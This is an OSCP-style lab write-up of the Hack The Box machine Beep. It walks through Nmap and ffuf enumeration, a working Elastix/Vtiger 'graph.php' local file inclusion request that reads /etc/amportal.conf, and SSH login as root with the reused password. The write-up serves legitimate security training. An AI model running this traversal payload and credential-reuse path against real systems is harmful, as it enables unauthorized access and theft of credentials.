---
title: Beep (Hack The Box) Full Write-Up
description: An OSCP-style Hack The Box Beep walkthrough covering manual enumeration, Elastix LFI, credential disclosure, and SSH root access through password reuse.
date: 2026-11-02T00:00:00+01:00
tags: [write-up]
tags_color: '#df1b1b'
---
**An OSCP-style walkthrough using Nmap, curl, ffuf, and SSH.**

## Introduction

Beep is a retired Linux machine on the Hack The Box platform. It was originally released in 2017. In this walkthrough, I’ll use a manual, terminal-based approach to understand the exploitation process step by step, with a focus on OSCP-style practice.

I use the official HTB walkthrough as a reference while documenting the commands and results from my own instance.

## Attack Path Summary

- Enumeration → Nmap reveals multiple services; web enumeration identifies Elastix
- Vulnerability → LFI through the bundled Vtiger CRM endpoint exposes `/etc/amportal.conf`
- Credential disclosure → the configuration file reveals a password
- Initial access → password reuse allows SSH login as root
- Privilege level → root access without a separate privilege escalation exploit

No automated exploitation frameworks. No unnecessary GUI tools.

**Target:** `10.129.94.148` — the IP assigned to my HTB instance. Replace this address with the IP assigned to yours.

---

## 1. Initial Enumeration

### Checking Target Availability

As always, I start by checking whether the target is up and reachable.

```bash
ping 10.129.94.148
```

```text
PING 10.129.94.148 (10.129.94.148) 56(84) bytes of data.
64 bytes from 10.129.94.148: icmp_seq=1 ttl=63 time=7.55 ms
64 bytes from 10.129.94.148: icmp_seq=2 ttl=63 time=7.86 ms
64 bytes from 10.129.94.148: icmp_seq=3 ttl=63 time=7.85 ms
64 bytes from 10.129.94.148: icmp_seq=4 ttl=63 time=7.54 ms
64 bytes from 10.129.94.148: icmp_seq=5 ttl=63 time=7.76 ms
^C
--- 10.129.94.148 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4007ms
rtt min/avg/max/mdev = 7.538/7.710/7.859/0.140 ms
```

The target responds to all five requests with no packet loss. I stop the command with `Ctrl+C` and prepare for port scanning.

### Preparing the Working Directory

I create directories for scan results, recovered files, and notes, then define the target IP.

```bash
mkdir -p ~/htb/beep/{scans,loot,notes}
cd ~/htb/beep

export IP=10.129.94.148
```

The following commands use `$IP` to reference the target. If I open a new terminal, I need to define the variable there as well.

### Full TCP Port Scan

I check all TCP ports to avoid overlooking services outside the commonly scanned range.

The Nmap outputs below were captured later than the HTTP response shown in section 2. I group the scan results here to keep the network enumeration findings together.

```bash
sudo nmap -Pn -sS -p- --min-rate 1000 \
  -oA scans/all-tcp "$IP"
```

Why these options?

- `-Pn` skips Nmap’s host discovery stage; I have already confirmed that the target responds.
- `-sS` performs a TCP SYN scan.
- `-p-` checks all 65,535 TCP ports.
- `--min-rate 1000` requests a minimum sending rate of 1,000 packets per second.
- `-oA` saves the results in normal, XML, and grepable formats.

My scan reveals the following open ports:

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-02 14:22 EST
Nmap scan report for 10.129.94.148
Host is up (0.0078s latency).
Not shown: 65519 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
443/tcp   open  https
857/tcp   open  unknown
993/tcp   open  imaps
995/tcp   open  pop3s
3306/tcp  open  mysql
4190/tcp  open  sieve
4445/tcp  open  upnotifyp
4559/tcp  open  hylafax
5038/tcp  open  unknown
10000/tcp open  snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 10.80 seconds
```

There are 16 open TCP ports, giving me several possible starting points.

This scan does not include version detection, so I treat the service names as preliminary labels rather than confirmed application identities. In particular, the label shown for port 10000 does not establish which application is listening there.

### Service and Version Detection

I investigate all 16 discovered ports with service detection and default NSE scripts. This covers the TCP ports found in the first scan; a separate UDP scan is not documented here. The minimum rate in the initial scan favors speed and can reduce reliability on a lossy link, so this is a recorded result rather than a guarantee that no other service exists.

```bash
sudo nmap -Pn -sV -sC \
  -p 22,25,80,110,111,143,443,857,993,995,3306,4190,4445,4559,5038,10000 \
  -oA scans/services "$IP"
```

The `-sV` option probes services to identify their software and versions, while `-sC` runs Nmap’s default script set.

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-02 14:24 EST
Nmap scan report for 10.129.94.148
Host is up (0.0077s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey:
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.129.94.148/
110/tcp   open  pop3?
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            854/udp   status
|_  100024  1            857/tcp   status
143/tcp   open  imap?
443/tcp   open  ssl/https?
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2026-11-02T19:29:03+00:00; +7s from scanner time.
857/tcp   open  status     1 (RPC #100024)
993/tcp   open  imaps?
995/tcp   open  pop3s?
3306/tcp  open  mysql?
4190/tcp  open  sieve?
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax?
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-server-header: MiniServ/1.570
Service Info: Host: 127.0.0.1

Host script results:
|_clock-skew: 6s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 579.34 seconds
```

Nmap identifies several useful leads:

- **Port 22:** OpenSSH 4.3.
- **Port 80:** Apache 2.2.3, with a redirect to HTTPS.
- **Port 5038:** Asterisk Call Manager 1.1.
- **Port 10000:** MiniServ 1.570, associated with Webmin.

Several other service identifications remain uncertain, as indicated by the question marks. The Asterisk service provides an early clue that the target may be a telephony environment.

I begin the manual web investigation with ports 80 and 443. The HTTP-to-HTTPS redirect gives me a clear starting point for inspecting the application.

I keep the other services in my notes so I can return to them if the web investigation reaches a dead end.

---

## 2. Web Enumeration from the Terminal

### Checking HTTP

I request the HTTP response headers.

```bash
curl -I "http://$IP/"
```

```text
HTTP/1.1 302 Found
Date: Mon, 02 Nov 2026 18:01:42 GMT
Server: Apache/2.2.3 (CentOS)
Location: https://10.129.94.148/
Connection: close
Content-Type: text/html; charset=iso-8859-1
```

The server returns `302 Found` and redirects me to HTTPS.

The headers also advertise Apache 2.2.3 running on CentOS, consistent with Nmap’s findings. I record this as an enumeration clue, but the banner alone does not confirm a vulnerability.

### Checking HTTPS

Next, I request the HTTPS response headers.

```bash
curl -k -I "https://$IP/"
```

```text
curl: (35) TLS connect error: error:0A000102:SSL routines::unsupported protocol
```

The connection fails during the TLS handshake, before I receive an HTTP response.

The `-k` option skips certificate verification. It does not enable legacy TLS protocols or resolve every compatibility problem with an older server.

I also try retrieving the page body.

```bash
curl -k -s "https://$IP/" | head -n 60
```

This produces no visible output. However, `-s` suppresses curl’s error messages, so the empty terminal does not establish that the server returned an empty page.

For subsequent requests, I use `-sS` to hide the progress meter while keeping errors visible.

### Troubleshooting Legacy TLS

Since this is an older target, I test whether I can reach the HTTPS service using TLS 1.0.

```bash
curl -k -sS --tlsv1.0 --tls-max 1.0 "https://$IP/"
```

```text
curl: (35) TLS connect error: error:0A0000BF:SSL routines::no protocols available
```

Explicitly requesting TLS 1.0 is not enough with my current client configuration. I retry with a lower OpenSSL security level for this individual request.

```bash
curl -k -sS --tlsv1.0 --tls-max 1.0 --ciphers 'DEFAULT:@SECLEVEL=0' "https://$IP/"
```

This time, the server returns an HTML page.

These compatibility options apply only to this curl command; they do not change my system-wide TLS settings.

### Identifying Elastix

The returned HTML contains the following title and stylesheet reference:

```html
<title>Elastix - Login page</title>
<link rel="stylesheet" href="themes/elastixneo/login_styles.css">
```

The page also includes username and password fields:

```html
<input type="text" id="input_user" name="input_user" class="neo-login-input" />
<input type="password" name="input_pass" class="neo-login-input" />
```

These details identify the page as an **Elastix login interface**, consistent with the telephony-related service found during network enumeration.

The HTML shown here does not establish the exact application version, so I record the product name without assuming a specific release.

With HTTPS working and the application identified, I move on to directory enumeration to look for additional components and exposed paths.

For further curl requests to this HTTPS service, I keep the working TLS options.

## 3. Directory Enumeration

With Elastix identified, I move on to web content discovery. I start with a short wordlist, then expand the search when it does not reveal the Vtiger CRM path mentioned in the reference walkthrough.

### First Pass with a Common Wordlist

```bash
ffuf \
  -u "https://$IP/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -k \
  -t 20 \
  -mc all \
  -fc 404 \
  -o scans/ffuf.json
```

The command uses 20 concurrent threads, keeps all HTTP status codes except `404`, and saves the results in JSON format.

Although curl required additional TLS compatibility options, ffuf successfully receives HTTPS responses with `-k` alone.

The following table summarizes the returned paths, with progress updates removed for readability:

| Path | HTTP Status | Response Size |
|---|---|---|
| `.hta` | 403 | 285 |
| `.htaccess` | 403 | 290 |
| `.htpasswd` | 403 | 290 |
| `admin` | 301 | 315 |
| `cgi-bin/` | 403 | 289 |
| `configs` | 301 | 317 |
| `favicon.ico` | 200 | 894 |
| `help` | 301 | 314 |
| `images` | 301 | 316 |
| `index.php` | 200 | 1785 |
| `lang` | 301 | 314 |
| `libs` | 301 | 314 |
| `mail` | 301 | 314 |
| `modules` | 301 | 317 |
| `panel` | 301 | 315 |
| `robots.txt` | 200 | 28 |
| `static` | 301 | 316 |
| `themes` | 301 | 316 |
| `var` | 301 | 313 |

These responses provide several leads:

- `200` means the request succeeded; the response content still needs inspection.
- `301` indicates a redirect whose destination needs checking.
- `403` means access was denied and does not, by itself, prove that a particular file exists.

The scan does not follow redirects, so it records the initial response for each tested path.

The first pass finds several resources, but `/vtigercrm` is not among the results. A wordlist scan only checks the names supplied to it, so I expand the search.

### Choosing a Larger Wordlist

I look for a larger directory wordlist already installed on my system.

```bash
find /usr/share/seclists/Discovery/Web-Content /usr/share/wordlists \
  -type f -iname '*directory-list*medium*' 2>/dev/null
```

```text
/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

I choose `DirBuster-2007_directory-list-2.3-medium.txt`.

Since the reference walkthrough mentions Vtiger CRM, I check whether this larger list contains the directory name.

```bash
grep -nFx 'vtigercrm' \
  /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

```text
171802:vtigercrm
```

The entry exists at line 171802. This confirms that the larger scan will test the name, but I still need a response from the target before treating it as a finding.

### Second Pass with the Larger Wordlist

I run another scan and save its output separately.

```bash
ffuf \
  -u "https://$IP/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -k \
  -t 20 \
  -rate 100 \
  -mc all \
  -fc 404 \
  -ic \
  -o scans/ffuf-medium.json
```

I keep the same response filter and thread count, limit the request rate to 100 per second, and use `-ic` to skip wordlist comments.

Redirects remain visible because they can reveal additional application paths.

The scan completes with the following final progress summary:

```text
Progress: [220546/220546] :: Job [1/1] :: 100 req/sec :: Duration: [0:36:48] :: Errors: 0 ::
```

The scan finishes in 36 minutes and 48 seconds with zero reported request errors. Since the reference walkthrough already mentioned Vtiger, this was an exercise in wordlist coverage. A direct request would have checked that specific path much faster

### Finding the Vtiger CRM Path

Rather than searching through terminal scrollback, I extract the relevant entry from the saved JSON file.

```bash
jq '.results[] | select(.input.FUZZ == "vtigercrm") | {url, status, length, words, lines}' \
  scans/ffuf-medium.json
```

```json
{
  "url": "https://10.129.94.148/vtigercrm",
  "status": 301,
  "length": 319,
  "words": 20,
  "lines": 10
}
```

The target returns `301 Moved Permanently` for `/vtigercrm`. The larger wordlist has revealed a responding path that did not appear in the first scan.

The recorded duration belongs to the complete scan, not to the moment this path was discovered.

The redirect alone does not establish the application version or confirm a vulnerability. With Elastix identified and the `/vtigercrm` path responding, I move on to focused research into the LFI described in the reference walkthrough.

---
## 4. Vulnerability Research

The official walkthrough identifies a local file inclusion vulnerability affecting the Elastix environment.

The reference is:

**Exploit-DB 37637**

I can inspect the locally available exploit reference using SearchSploit.

```bash
searchsploit elastix
```
```text
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Elastix - 'page' Cross-Site Scripting         | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulne | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclus | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection             | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection            | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code  | php/webapps/18650.py
---------------------------------------------- ---------------------------------
Shellcodes: No Results
```

To locate the specific entry:

```bash
searchsploit -p 37637
```
```text
  Exploit: Elastix 2.2.0 - 'graph.php' Local File Inclusion
      URL: https://www.exploit-db.com/exploits/37637
     Path: /usr/share/exploitdb/exploits/php/webapps/37637.pl
    Codes: N/A
 Verified: True
File Type: ASCII text
Copied EDB-ID #37637's path to the clipboard
```

The entry is available in my local Exploit-DB database, so I copy it into my working directory for inspection.

```bash
searchsploit -m 37637
```
```text
  Exploit: Elastix 2.2.0 - 'graph.php' Local File Inclusion
      URL: https://www.exploit-db.com/exploits/37637
     Path: /usr/share/exploitdb/exploits/php/webapps/37637.pl
    Codes: N/A
 Verified: True
File Type: ASCII text
Copied to: /home/funsin/htb/beep/37637.pl
```

I read the proof of concept before using it.

This matters for OSCP preparation. I want to understand the vulnerable parameter and the expected result rather than execute an unfamiliar script and hope for a shell.

### Understanding the LFI

Local File Inclusion occurs when an application accepts a file path from user-controlled input without properly restricting which files can be accessed.

Here, `/vtigercrm/graph.php` uses the user-controlled `current_language` parameter in a local PHP inclusion path. The traversal segments escape the intended language-file directory and target a file readable by the web server process. Inclusion of a plain-text configuration file exposes its contents in the response; it does not by itself provide a shell or execute that file as a command.

The application can be manipulated into reading a local configuration file outside its intended directory.

The file identified in the official walkthrough is:

```text
/etc/amportal.conf
```

That file is particularly interesting because the system's telephony applications use configuration values and credentials stored there.

---

## 5. Testing the LFI Manually

The reference walkthrough identifies `/vtigercrm/graph.php` as the endpoint used to read a local configuration file through the `current_language` parameter.

I test the request manually with curl and save the response.

```bash
curl -k -sS --path-as-is \
  "https://$IP/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action" \
  -o loot/amportal-response.txt
```

The first attempt fails:

```text
curl: (35) TLS connect error: error:0A000102:SSL routines::unsupported protocol
```

This is the same TLS compatibility problem encountered during web enumeration. The request fails before I receive an HTTP response, so it tells me nothing about whether the LFI works.

I repeat the request with the TLS options that previously allowed me to retrieve the Elastix login page.

```bash
curl -k -sS --path-as-is \
  --tlsv1.0 --tls-max 1.0 \
  --ciphers 'DEFAULT:@SECLEVEL=0' \
  "https://$IP/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action" \
  -o loot/amportal-response.txt
```

The traversal sequence targets `/etc/amportal.conf`. The `%00` encodes a null byte: in the historical vulnerable PHP file-handling behavior, it terminates the filename before an application-appended suffix. This is a legacy behavior, not a general technique that works on current PHP versions. The Exploit-DB proof of concept uses this exact request shape. The response below confirms file disclosure on this instance; it does not independently reveal the underlying source code or establish every affected version. `--path-as-is` disables curl path normalization, although the traversal here is in the query parameter rather than the URL path.

### Inspecting the Response

I inspect the beginning of the saved response.

```bash
head -n 40 loot/amportal-response.txt
```

The response contains FreePBX configuration content, including the following excerpts. Password values are redacted for publication.

```text
# This file is part of FreePBX.
```

```text
# This file contains settings for components of the Asterisk Management Portal
# Spaces are not allowed!
# Run /usr/src/AMP/apply_conf.sh after making changes to this file
```

```text
AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=[REDACTED]
AMPDBPASS=[REDACTED]
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=[REDACTED]
AMPMGRPASS=[REDACTED]
```

Instead of the login page, I receive configuration content consistent with the requested AMPortal file. This confirms that the request exposes a local configuration file on this instance.

### Extracting Credential Settings

To locate database and ARI administration credentials, I search the saved response.

```bash
grep -nE 'AMPDB(USER|PASS)|ARI_ADMIN_(USERNAME|PASSWORD)' \
  loot/amportal-response.txt
```

Selected matching lines are shown below, with passwords redacted:

```text
33:AMPDBUSER=asteriskuser
34:# AMPDBPASS=[REDACTED]
35:AMPDBPASS=[REDACTED]
72:ARI_ADMIN_USERNAME=admin
76:ARI_ADMIN_PASSWORD=[REDACTED]
80:# AMP admin credentials will be the AMPDBUSER/AMPDBPASS above.
```

The distinction between comments and active settings matters. Line 34 begins with `#`, so I do not treat it as the active database password. Line 35 contains the uncommented `AMPDBPASS` setting.

The active settings expose:

- Database username: `asteriskuser`
- ARI administrator username: `admin`
- The same password value for `AMPDBPASS` and `ARI_ADMIN_PASSWORD`

The earlier configuration excerpt also shows that `AMPMGRPASS` uses this same value.

I keep the recovered credentials in my private notes. Their reuse across several application settings makes credential reuse worth investigating, but it does not yet prove that the password works for an operating-system account.

### What the LFI Has Established

At this stage, I have confirmed local configuration disclosure and recovered credentials. I have not obtained a shell or demonstrated remote code execution.

The next step is to test whether the recovered password is also accepted by another exposed service. Since SSH is available on port 22, I can investigate the password-reuse path described in the reference walkthrough.

## 6. From Credential Disclosure to Root

The official walkthrough identifies password reuse as the next weakness.

A password stored in the exposed AMPortal configuration is also accepted for the system's root account over SSH.

This is an important distinction.

The LFI doesn't directly grant root privileges. It exposes a credential, and password reuse turns that disclosure into privileged access.

I test the active `AMPDBPASS` value against SSH as `root`:

```bash
ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 -oHostKeyAlgorithms=+ssh-rsa root@"$IP"
```

When prompted, I enter the password recovered from the active AMPDBPASS setting. The successful login confirms that the database password is also used by the system’s root account.

```text
The authenticity of host '10.129.94.148 (10.129.94.148)' can't be established.
RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.94.148' (RSA) to the list of known hosts.
root@10.129.94.148's password:

Last login: Wed Nov 15 12:55:38 2023

Welcome to Elastix
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.129.94.148

[root@beep ~]#

```



Once connected, I verify the session:

```text
[root@beep ~]# whoami
root
[root@beep ~]# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
[root@beep ~]# hostname
beep
[root@beep ~]# pwd
/root

```

No privilege-escalation exploit is required in this path.

The privilege boundary was crossed through credential reuse.

---

## 7. Verifying the Objective

The `whoami` and `id` output in the previous section confirms that the SSH session runs as root. There is no separate low-privilege shell in this route.

I inspect the home directories with:

```bash
ls -la /home /root
```

The recorded listing shows the `fanis` and `spamfilter` directories under `/home` and `root.txt` under `/root`. I omit the full listing here for readability.

My notes also contain this search command, but no captured output from it:

```bash
find /home /root -type f \( -name 'user.txt' -o -name 'root.txt' \) 2>/dev/null
```
The recorded flag reads were `cat root.txt` from `/root`, followed by `cat /home/fanis/user.txt`. Both values are withheld from this write-up:

```text
[root@beep ~]# cat root.txt
[REDACTED]
[root@beep ~]# cat /home/fanis/user.txt
[REDACTED]
```

The corresponding absolute paths are `/root/root.txt` and `/home/fanis/user.txt`. Reading the user flag from a root session does not demonstrate a separate login as `fanis`.

I keep flag values out of the public write-up. The goal is to document the method and evidence, not the answer strings.

---

## 8. What I Learned

Beep is a useful reminder that the hardest part of a machine isn't always exploitation.

Sometimes it's deciding where to spend your time.

This machine exposes many services, but the documented route is relatively short:

```text
Nmap enumeration
      |
      v
Web application discovery
      |
      v
Elastix / Vtiger CRM
      |
      v
Local File Inclusion
      |
      v
/etc/amportal.conf
      |
      v
Credential disclosure
      |
      v
Password reuse
      |
      v
SSH as root
```


**Credentials can be more powerful than code execution.** A single exposed password can lead directly to administrative access if it has been reused.

---

## References

- Hack The Box — **Beep**, official walkthrough, Alexander Reid (Arrexel), October 2017.
- Exploit-DB — [Elastix LFI, EDB-ID 37637](https://www.exploit-db.com/exploits/37637).

---

**ShellThisBox — Every shell has its story.**

**Learn by doing. Document the journey.**
